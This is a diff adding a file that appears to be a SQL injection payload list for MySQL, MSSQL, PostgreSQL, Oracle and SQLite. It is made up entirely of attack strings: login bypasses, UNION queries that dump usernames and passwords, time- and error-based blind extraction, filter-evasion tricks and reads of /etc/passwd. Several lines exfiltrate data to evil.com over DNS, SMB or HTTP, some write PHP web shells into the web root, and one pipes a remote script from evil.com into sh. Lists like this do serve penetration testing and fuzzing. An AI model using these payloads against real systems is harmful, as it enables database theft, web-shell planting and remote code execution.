@@ -1,0 +1,83 @@
+' OR '1'='1' --
+' OR '1'='1' #
+' UNION SELECT username, password FROM users --
+' AND SLEEP(5) --
+SELECT * FROM users WHERE username='admin' AND password='password'
+SELECT * FROM users WHERE username LIKE '%admin%'
+" OR 1=1 --
+" OR 1=1 #
+" UNION SELECT username, password FROM users --
+" AND SLEEP(5) --
+' UNION ALL SELECT null, null, null, table_name FROM information_schema.tables WHERE table_schema = database() --
+' OR 1=1-- -  
+' || 1=1-- -  
+' XOR (SELECT 1 FROM DUAL WHERE 1=1)--  
+' OR 'a'='a'/*  
+' OR '1' IN (SELECT '1')--  
+' OR SLEEP(5)-- -                      # MySQL  
+' WAITFOR DELAY '0:0:5'--              # MSSQL  
+' || pg_sleep(5)-- -                   # PostgreSQL  
+' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))--  # PostgreSQL  
+' ; EXECUTE IMMEDIATE 'BEGIN DBMS_LOCK.SLEEP(5); END;'--  # Oracle  
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user()),0x7e)-- -  # MySQL  
+' OR 1=CONVERT(int, (SELECT @@version))--              # MSSQL  
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--  # PostgreSQL  
+' || UTL_INADDR.GET_HOST_NAME((SELECT user FROM DUAL))--  # Oracle  
+' UNION/*!50000SELECT*/ 1,2,3-- -  
+' UNION SELECT+NULL,NULL,table_name+FROM+information_schema.tables--  
+' UNION ALL SELECT 'a','b',CONCAT(user,0x3a,password) FROM users--  
+' || (SELECT 1,LOAD_FILE('/etc/passwd'))-- -  
+'/**/OR/**/'1'='1'-- -        # Bypass space filters  
+'%0AOR%0A1=1-- -              # Newline bypass  
+' UNI\x4fN SELECT 1,2,3-- -   # Hex encoding  
+' OR 1 LIKE 1-- -             # Alternative operators  
+' OR 1 BETWEEN 0 AND 2-- -  
+' OR 1 REGEXP 1-- -           # Regex-based  
+' || (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.evil.com\\test.txt')))-- -  # MySQL SMB  
+' ; EXEC xp_dirtree '\\'+(SELECT TOP 1 column_name FROM information_schema.columns)+'.evil.com\a'--  # MSSQL  
+' || COPY (SELECT * FROM users) TO PROGRAM 'curl http://evil.com?c=$(cat /etc/passwd)'-- -  # PostgreSQL  
+' || UTL_HTTP.REQUEST('http://evil.com/?c='||(SELECT user FROM DUAL))-- -  # Oracle  
+' OR JSON_EXTRACT('{"a":1}', '$.a')=1-- -  # MySQL  
+' || (SELECT '[{"a":"'||user||'"}]'::json->0->>'a')-- -  # PostgreSQL  
+'# MySQL  
+'-- -  
+'/*Comment*/ OR 1=1  
+';%00  # Null-byte termination  
+' OR 1%2b1=2-- -  
+' OR ASCII(SUBSTR(user(),1,1))>90-- -  
+' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--  
+'||(SELECT '<?php system($_GET[0]); ?>') INTO OUTFILE '/var/www/shell.php'-- -  # PHP Shell  
+' UNION SELECT '<?xml', '<?php system("id"); ?>', '1' INTO DUMPFILE '/tmp/x'--  
+' OR JSON_VALUE('{"a":1}', '$.a')=1-- -  /* MySQL 5.7+ */
+' || (SELECT xmlparse(document '<x/>')::text--  /* PostgreSQL XML */
+'/**/UNION/**/SELECT+0x504F5354454752455351/*(PostgreSQL)*/,2,3-- -
+' OR 1 REGEXP 0x5e5b302d395d2b24-- -  /* Regex match (MySQL) */
+' OR BINARY '1'='1' COLLATE utf8_bin-- -  /* Case-sensitive bypass */
+' OR BENCHMARK(1e6,MD5('x'))-- -  /* MySQL CPU delay */
+' || pg_sleep(5-(CASE WHEN (SELECT current_user)='postgres' THEN 0 ELSE 5 END))-- -  /* Conditional sleep */
+'||(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT+password+FROM+users+LIMIT+1),'.evil.com\\')))-- -  /* MySQL SMB */
+'; EXEC master..xp_subdirs '\\'+(SELECT TOP 1 name FROM sys.databases)+'.evil.com\'--  /* MSSQL DNS */
+' OR (1<<1)=2-- -  /* Bit shift (PostgreSQL) */
+' OR ~0+1=1-- -    /* Bitwise NOT (MySQL) */
+' OR (SELECT @@GLOBAL.ssl_version)=1-- -  /* MySQL SSL info */
+' || (SELECT getenv('USER'))-- -  /* PostgreSQL (if permitted) */
+' UNION SELECT ENTITY_DECODE('<!ENTITY xxe SYSTEM "file:///etc/passwd">]>%xxe;'),2-- -  /* MSSQL XXE */
+' UNION SELECT "<?php system($_GET['cmd']); ?>",2 INTO OUTFILE '/var/www/shell.php'-- -  /* PHP shell (MySQL) */
+' || COPY (SELECT 'curl http://evil.com/shell.sh | sh') TO PROGRAM 'bash'-- -  /* PostgreSQL RCE */
+' OR (SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL)='SYSTEM'-- -  /* Oracle */
+' || (SELECT sqlite_version())-- -  /* SQLite */
+' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a')=1-- -  /* Blind char extraction */
+'%23MySQLComment /*!32302 AND 1=1 */
+'--sp_password  /* MSSQL bypass (hides from logs) */
+' OR '1'=1'=1-- -  /* PHP/MySQL type confusion */
+' OR TRUE IS NOT FALSE-- -  /* PostgreSQL */
+';WITH x AS (SELECT * FROM users) SELECT * FROM x-- -  /* MSSQL/PostgreSQL */
+' UNION SELECT 1/0 FROM (SELECT table_name FROM information_schema.tables) x-- -  /* Error-based table leak */
+' OR CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))='admin'-- -  /* MySQL CHAR() */
+' || 'adm'||'in'='admin'-- -  /* Split keywords */
+' OR SET @x=(SELECT password FROM users LIMIT 1);SLEEP(@x)-- -  /* MySQL variable delay */
+' || (SELECT json_agg(table_name) FROM information_schema.tables)-- -  /* PostgreSQL JSON dump */
+' OR 'K'=N'K'-- -  /* MSSQL Unicode homoglyphs (K = Kelvin sign, treated as 'K') */
+'; SELECT lo_import('/etc/passwd', 1234); SELECT lo_get(1234)-- -  /* Read files via OID */
+' UNION SELECT 'javascript:alert(1)',2,3-- -  /* If rendered in browser context */
+
